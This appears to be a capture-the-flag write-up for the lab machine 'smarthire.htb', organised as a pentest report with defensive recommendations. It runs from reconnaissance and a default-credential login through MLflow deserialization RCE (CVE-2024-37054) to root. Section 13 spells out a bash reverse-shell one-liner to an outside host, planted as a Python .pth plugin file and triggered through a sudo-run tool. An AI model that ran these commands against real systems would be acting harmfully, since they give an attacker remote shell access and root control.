# Analysis and Enumeration Report

---

# 1. Initial Scan

A reconnaissance scan was performed against target `10.129.221.157` in order to identify exposed services and obtain an initial view of the attack surface. During this phase, only two open ports were detected: `22/tcp`, corresponding to SSH, and `80/tcp`, corresponding to the web service running on nginx.

The scan also showed that the web server redirected to the domain `smarthire.htb`, so it was necessary to associate that name with the host in order to continue the enumeration of the service.

**Command used:**

```bash
nmap -sS --open -sC -sV -n -Pn 10.129.221.157
```

<img width="1889" height="786" alt="image" src="https://github.com/user-attachments/assets/42756380-a013-452a-9d95-b5f3134bd423" />

**Recommendations:**

- Restrict SSH access by IP or VPN.
- Keep exposed services updated.
- Review whether the host should respond with public redirections.

---

# 2. Initial Web Enumeration

After configuring domain resolution, the main page of the web service was accessed to review its content and check whether any visible interaction points existed. The interface did not show especially useful elements or relevant forms at first glance, so a superficial review of the source code and common routes was carried out.

During this phase, it was confirmed that the main website redirected to `/login`, indicating the existence of an authentication panel for part of the application.

**Commands used:**

```bash
whatweb http://smarthire.htb
curl -I http://smarthire.htb
```

<img width="1308" height="713" alt="image" src="https://github.com/user-attachments/assets/741f00ee-7262-4a08-a5f8-a591cd0bd011" />

<img width="1267" height="933" alt="image" src="https://github.com/user-attachments/assets/ee453949-45bc-4e3b-af7a-85f3238302b1" />

**Recommendations:**

- Hide unnecessary information in HTTP headers.
- Review that public pages do not expose internal routes.
- Protect the login panel with additional controls such as MFA.

---

# 3. Subdomain Discovery

Since the web server was deployed on nginx, the possibility of multiple subdomains or a reverse proxy setup was considered. Because the main page offered little interaction, enumeration was focused on discovering virtual hosts associated with the `smarthire.htb` domain.

Through fuzzing of the `Host` header, an initial subdomain search was performed without visible results of interest. However, after expanding the enumeration, the subdomain `models.smarthire.htb` appeared and responded with code `401 Unauthorized`, confirming the existence of an additional protected service.

**Command used:**

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.smarthire.htb" -u http://smarthire.htb -fs 0
```

<img width="1578" height="539" alt="image" src="https://github.com/user-attachments/assets/3b47d8e4-0683-4c39-91cd-10b024eac038" />

<img width="1882" height="713" alt="image" src="https://github.com/user-attachments/assets/5e32b6aa-8eb9-45c6-b2a2-dac3a716b366" />

**Recommendations:**

- Reduce the public surface of unnecessary subdomains.
- Protect internal services with strong authentication.
- Avoid banners or responses that make reconnaissance easier.

---

# 4. Crawling and Route Discovery

While subdomain discovery was ongoing, crawling was also performed on the main application to locate hidden routes and files. This phase allowed the discovery of resources such as `/login`, `/register`, several Tailwind-related files inside `/static/js/`, and the `template.html` file.

Although these findings expanded the initial map of the application, the discovery of `models.smarthire.htb` made this route less relevant, since it offered a more promising attack surface.

**Command used:**

```bash
katana -u http://smarthire.htb
```

<img width="736" height="627" alt="image" src="https://github.com/user-attachments/assets/7a2d3932-c214-4289-bfe5-bc6b35502b5d" />

**Recommendations:**

- Review which static resources are actually required.
- Avoid leaving template or test files accessible.
- Remove internal references visible in the frontend.

---

# 5. Access to the Subdomain

When accessing `models.smarthire.htb`, it was confirmed that the content was publicly exposed. At that moment, there was no apparent authentication barrier, and the service could be explored directly from the browser.

Once this behavior was identified, the application was interacted with in order to understand its internal functioning and determine whether exploitable weaknesses existed.

**Command used:**

```bash
curl -i http://models.smarthire.htb
```

<img width="1477" height="709" alt="image" src="https://github.com/user-attachments/assets/cc6d8531-216d-49dd-bdb4-d986b6f5865d" />

**Recommendations:**

- Do not expose administrative interfaces without access control.
- Place the service behind a proxy with restrictions.
- Log and monitor access to internal services.

---

# 6. Access Validation

After reviewing the subdomain behavior, it was confirmed that an authentication form did exist. Initially the exact credentials were unknown, so several attempts were made until access was achieved. Since this was a service exposed on a subdomain, simple credentials such as `admin`, `test`, and `password` were tested first, following a basic common-access validation approach.

After identifying the access form, default credentials were tested, and authentication was achieved with `admin` and `password`. Once inside the application, an initial review of the content was performed using `curl` and string filtering in order to locate possible references to APIs, development environments, or administrative elements. During this review, several clues related to developer-oriented sections appeared, such as “API Reference”, although no clearly exploitable functionality was identified yet.

<img width="1889" height="906" alt="image" src="https://github.com/user-attachments/assets/1ca790f0-f025-4355-898c-221ee82472d1" />

<img width="2045" height="981" alt="image" src="https://github.com/user-attachments/assets/01d23ca4-5e85-4fd3-a9ec-9dc113c89d7d" />

**Recommendations:**

- Apply stronger password policies.
- Limit authentication attempts.
- Enable lockout or alerts for repeated testing.

---

# 7. Technology Identification

After interacting with the subdomain for a while and reviewing how the service worked, it was identified that it was based on MLflow 2.14.1. From that point onward, several public exploits related to the technology were tested, although not all were successful.

One exploit was compatible and allowed further progress, as it was associated with CVE-2024-37054, related to insecure model deserialization in MLflow. Version 2.14.1 is among those affected by this issue.

<img width="1904" height="913" alt="image" src="https://github.com/user-attachments/assets/337a2435-76e0-4f2d-8743-af04faead8d4" />

**Recommendations:**

- Keep MLflow and dependencies updated at all times.
- Restrict model uploads to trusted sources.
- Avoid executing unvalidated artifacts in production environments.

---

# 8. MLflow Exploitation

Once access to the panel was validated and the technology was confirmed, a public exploit compatible with the detected version was used. The process allowed a model to be registered, the corresponding artifact to be manipulated, and the model load to be triggered from the main application, leading to remote code execution.

As a result, a reverse shell was obtained on the target system. The selected repository was a public PoC for CVE-2024-37054 oriented to MLflow RCE.

**Command used:**

```bash
python3 exploit.py --mlflow http://models.smarthire.htb
```

<img width="1680" height="806" alt="image" src="https://github.com/user-attachments/assets/0600c5a2-5287-4dcd-b3a7-02c72e7627cc" />

<img width="1709" height="820" alt="image" src="https://github.com/user-attachments/assets/25dbc7e4-07dc-4da8-8a4f-af37df33a337" />

**Recommendations:**

- Do not allow models from unverified sources.
- Run inference processes in a sandbox.
- Validate and isolate artifacts before loading them.

---

# 9. Initial System Access

The obtained shell belonged to the user `svcweb`. From that point, an initial enumeration of the environment was performed to locate relevant application files and better understand the system structure.

Inside the working directory, files such as `app.py`, `config.py`, `.env`, `requirements.txt`, `smarthire.db`, `templates`, `static`, `utils`, and `wsgi.py` were found, confirming that this was a Python application with a local database.

**Commands used:**

```bash
script /dev/null
ls
```

<img width="1374" height="614" alt="image" src="https://github.com/user-attachments/assets/ede63552-a259-45a0-9e44-a0d6931a38ad" />

**Recommendations:**

- Keep credentials and secrets outside the codebase.
- Protect `.env` files and sensitive configurations.
- Apply least privilege to the service account.
- Do not store credentials in plaintext.
- Use secure variables or secret managers.
- Review read permissions on configuration files.

---

# 10. System Enumeration

Once inside the system as `svcweb`, the `/etc/passwd` file was reviewed to identify local users and possible accounts of interest. This review showed the presence of the `lxd` user, in addition to the `svcweb` service account.

Next, privilege configuration was checked with `sudo -l` in order to verify whether any privileged execution permissions or misconfigurations existed that could be useful in a later phase.

**Commands used:**

```bash
cat /etc/passwd
sudo -l
```

<img width="2375" height="1139" alt="image" src="https://github.com/user-attachments/assets/3fadb14c-ed87-4ef4-889a-f571692240d8" />

<img width="2997" height="1438" alt="image" src="https://github.com/user-attachments/assets/3fbddb04-2274-4b08-a05a-848d8f131bca" />

**Recommendations:**

- Review system accounts with excessive permissions.
- Limit sudo rules to what is strictly necessary.
- Audit groups with access to sensitive resources.

---

# 11. Internal Administration Utility

During local enumeration, the file `/opt/tools/mlflow_ctl/mlflowctl.py` was located. This is an internal utility designed to manage the MLflow service. The script allows actions such as `status`, `backup-models`, and `restart`, and also includes a plugin system to load environment-specific logic.

This finding was relevant because it showed an internal administration tool capable of extending functionality through auxiliary modules.

**Command used:**

```bash
cat /opt/tools/mlflow_ctl/mlflowctl.py
```

<img width="1349" height="1241" alt="image" src="https://github.com/user-attachments/assets/6f383438-d761-43fe-8654-15dca0418aa0" />

**Recommendations:**

- Restrict the execution of administrative tools.
- Ensure plugins are only loaded from safe paths.
- Avoid privileged scripts without strict control.

---

# 12. Plugin and Permission Review

When inspecting the plugin directory associated with the internal utility, it was observed that a `dev` subdirectory existed with group write permissions, while other components remained controlled by `root`. In addition, the `svcweb` user belonged to the `devs` group, which indicated a potentially weak permissions configuration.

This point was especially interesting because the tool loaded additional modules from that location, which broadened the system’s attack surface.

**Commands used:**

```bash
ls -la /opt/tools/mlflow_ctl/
ls -la /opt/tools/mlflow_ctl/plugins/
id
cd /opt/tools/mlflow_ctl/plugins/
```

<img width="1715" height="911" alt="image" src="https://github.com/user-attachments/assets/98fe8c8f-e328-4239-804e-87aa753f2bb9" />

**Recommendations:**

- Review write permissions in plugin directories.
- Remove access from unnecessary groups.
- Clearly separate production and development files.

---

# 13. Privilege Escalation to Root

After confirming that the user had permissions over the `dev` directory, the execution of the utility with sudo was leveraged to load controlled content from that path. On the first attempt, the session was accidentally closed, so the process had to be repeated until a stable connection was obtained.

Finally, after re-running the tool with elevated privileges, a new shell with root permissions was obtained, confirming full privilege escalation on the system.

**Commands used:**

```bash
echo 'import os; os.system("bash -c \"bash -i >& /dev/tcp/10.10.14.22/4444 0>&1\"")' > /opt/tools/mlflow_ctl/plugins/dev/exploit.pth
sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status
cat /root/root.txt
cat /home/svcweb/user.txt
```

<img width="2443" height="65" alt="image" src="https://github.com/user-attachments/assets/2aa2672a-952e-4521-95ec-15ba2eb6cc2e" />

<img width="2365" height="581" alt="image" src="https://github.com/user-attachments/assets/072914e5-2405-4992-9bd2-03529e1e5e0c" />

**Recommendations:**

- Prevent non-administrative users from modifying plugins loaded by services.
- Review any dynamic execution mechanism carefully.
- Run privileged tools with immutable and controlled paths.
